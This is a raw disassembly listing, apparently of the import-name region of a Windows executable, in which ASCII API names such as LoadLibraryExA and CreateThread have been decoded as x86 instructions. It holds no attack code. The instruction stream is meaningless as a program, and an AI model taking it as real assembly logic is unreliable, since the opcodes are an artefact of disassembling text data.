  41dc14:	ins    BYTE PTR es:[edi],dx
  41dc15:	gs push ebx
  41dc17:	je     0x41dc7a
  41dc19:	je     0x41dc80
  41dc1b:	add    bl,bh
  41dc1d:	add    DWORD PTR [edi+0x65],eax
  41dc20:	je     0x41dc6e
  41dc22:	popa   
  41dc23:	jae    0x41dc99
  41dc25:	inc    ebp
  41dc26:	jb     0x41dc9a
  41dc28:	outs   dx,DWORD PTR ds:[esi]
  41dc29:	jb     0x41dc2b
  41dc2b:	add    BYTE PTR [eax+0x6f6c4702],dl
  41dc31:	bound  esp,QWORD PTR [ecx+0x6c]
  41dc34:	inc    esi
  41dc35:	jb     0x41dc9c
  41dc37:	add    BYTE PTR gs:[eax],al
  41dc3a:	or     al,BYTE PTR [edx]
  41dc3c:	inc    edi
  41dc3d:	gs je  0x41dc8d
  41dc40:	outs   dx,DWORD PTR ds:[esi]
  41dc41:	fs jne 0x41dcb0
  41dc44:	gs dec eax
  41dc46:	popa   
  41dc47:	outs   dx,BYTE PTR ds:[esi]
  41dc48:	fs ins BYTE PTR es:[edi],dx
  41dc4a:	gs inc ecx
  41dc4c:	add    BYTE PTR [eax],al
  41dc4e:	js     0x41dc53
  41dc50:	push   edx
  41dc51:	gs popa 
  41dc53:	fs inc esi
  41dc55:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47019000
  41dc5d:	gs je  0x41dca3
  41dc60:	push   eax
  41dc61:	dec    ecx
  41dc62:	outs   dx,BYTE PTR ds:[esi]
  41dc63:	outs   dx,WORD PTR ds:[esi]
  41dc65:	add    BYTE PTR ds:0x74655304,ah
  41dc6b:	dec    ebp
  41dc6c:	popa   
  41dc6d:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41dc75:	outs   dx,WORD PTR ds:[esi]
  41dc77:	add    dh,bh
  41dc79:	add    DWORD PTR [edi+0x65],eax
  41dc7c:	je     0x41dcca
  41dc7e:	outs   dx,DWORD PTR ds:[esi]
  41dc7f:	arpl   WORD PTR [ecx+0x6c],sp
  41dc82:	gs dec ecx
  41dc84:	outs   dx,BYTE PTR ds:[esi]
  41dc85:	outs   dx,WORD PTR ds:[esi]
  41dc87:	inc    ecx
  41dc88:	add    BYTE PTR [eax],al
  41dc8a:	push   es
  41dc8b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41dc8f:	fs dec esp
  41dc91:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  41dc98:	js     0x41dcdb
  41dc9a:	add    BYTE PTR [eax],al
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	add    al,BYTE PTR [edi+0x65]
  41dca0:	je     0x41dcf6
  41dca2:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41dca9:	popa   
  41dcaa:	je     0x41dced
  41dcac:	add    BYTE PTR [eax],al
  41dcae:	inc    DWORD PTR [ecx]
  41dcb0:	inc    edi
  41dcb1:	gs je  0x41dd00
  41dcb4:	outs   dx,DWORD PTR ds:[esi]
  41dcb5:	arpl   WORD PTR [ecx+0x6c],sp
  41dcb8:	gs dec ecx
  41dcba:	outs   dx,BYTE PTR ds:[esi]
  41dcbb:	outs   dx,WORD PTR ds:[esi]
  41dcbd:	push   edi
  41dcbe:	add    BYTE PTR [eax],al
  41dcc0:	rol    BYTE PTR [esp+ebp*2],0x73
  41dcc4:	je     0x41dd38
  41dcc6:	arpl   WORD PTR [ecx+0x74],sp
  41dcc9:	push   edi
  41dcca:	add    BYTE PTR [eax],al
  41dccc:	repnz add DWORD PTR [edi+0x65],eax
  41dcd0:	je     0x41dd18
  41dcd2:	jne    0x41dd40
  41dcd4:	ins    BYTE PTR es:[edi],dx
  41dcd5:	push   eax
  41dcd6:	popa   
  41dcd7:	je     0x41dd41
  41dcd9:	dec    esi
  41dcda:	popa   
  41dcdb:	ins    DWORD PTR es:[edi],dx
  41dcdc:	gs inc ecx
  41dcde:	add    BYTE PTR [eax],al
  41dce0:	cmp    al,0x3
  41dce2:	dec    edi
  41dce3:	jo     0x41dd4a
  41dce5:	outs   dx,BYTE PTR ds:[esi]
  41dce6:	inc    esi
  41dce7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41dcef:	outs   dx,BYTE PTR ds:[esi]
  41dcf0:	addr16 push edi
  41dcf2:	add    BYTE PTR [eax],al
  41dcf4:	stc    
  41dcf5:	add    cl,BYTE PTR [ecx+0x73]
  41dcf8:	inc    edx
  41dcf9:	popa   
  41dcfa:	fs push ebx
  41dcfc:	je     0x41dd70
  41dcfe:	imul   ebp,DWORD PTR [esi+0x67],0x57727450
  41dd05:	add    dl,cl
  41dd07:	add    BYTE PTR [ebx+0x72],al
  41dd0a:	gs popa 
  41dd0c:	je     0x41dd73
  41dd0e:	inc    ebp
  41dd0f:	jbe    0x41dd76
  41dd11:	outs   dx,BYTE PTR ds:[esi]
  41dd12:	je     0x41dd55
  41dd14:	add    BYTE PTR [eax],al
  41dd16:	ins    DWORD PTR es:[edi],dx
  41dd17:	add    al,0x55
  41dd19:	outs   dx,BYTE PTR ds:[esi]
  41dd1a:	ins    BYTE PTR es:[edi],dx
  41dd1b:	outs   dx,DWORD PTR ds:[esi]
  41dd1c:	arpl   WORD PTR [ebx+0x46],bp
  41dd1f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x45011300
  41dd27:	outs   dx,BYTE PTR ds:[esi]
  41dd28:	je     0x41dd8f
  41dd2a:	jb     0x41dd6f
  41dd2c:	jb     0x41dd97
  41dd2e:	je     0x41dd99
  41dd30:	arpl   WORD PTR [ecx+0x6c],sp
  41dd33:	push   ebx
  41dd34:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41dd39:	outs   dx,BYTE PTR ds:[esi]
  41dd3a:	add    BYTE PTR [eax],al
  41dd3c:	pop    edi
  41dd3d:	add    al,0x54
  41dd3f:	ins    BYTE PTR es:[edi],dx
  41dd40:	jae    0x41dd89
  41dd42:	gs je  0x41dd9b
  41dd45:	popa   
  41dd46:	ins    BYTE PTR es:[edi],dx
  41dd47:	jne    0x41ddae
  41dd49:	add    BYTE PTR [ebx+0x61654802],ah
  41dd4f:	jo     0x41dd94
  41dd51:	jb     0x41ddb8
  41dd53:	popa   
  41dd54:	je     0x41ddbb
  41dd56:	add    BYTE PTR [eax],al
  41dd58:	dec    ebp
  41dd59:	add    al,0x53
  41dd5b:	ins    BYTE PTR es:[edi],dx
  41dd5c:	gs gs jo 0x41dd60
  41dd60:	jnp    0x41dd63
  41dd62:	inc    esi
  41dd63:	outs   dx,DWORD PTR ds:[esi]
  41dd64:	ins    BYTE PTR es:[edi],dx
  41dd65:	fs push ebx
  41dd67:	je     0x41dddb
  41dd69:	imul   ebp,DWORD PTR [esi+0x67],0x47a0057
  41dd70:	push   esi
  41dd71:	gs jb  0x41ddc7
  41dd74:	gs je  0x41ddba
  41dd77:	outs   dx,DWORD PTR ds:[esi]
  41dd78:	outs   dx,BYTE PTR ds:[esi]
  41dd79:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  41dd82:	imul   eax,DWORD PTR [eax],0xffffff94
  41dd85:	add    al,0x57
  41dd87:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  41dd8e:	in     eax,dx
  41dd8f:	add    BYTE PTR [ebx+0x72],al
  41dd92:	gs popa 
  41dd94:	je     0x41ddfb
  41dd96:	push   esp
  41dd97:	push   0x64616572
  41dd9c:	add    BYTE PTR [eax],al
  41dd9e:	rol    BYTE PTR [eax],cl
  41dda0:	inc    ebx
  41dda1:	jb     0x41de08
  41dda3:	popa   
  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
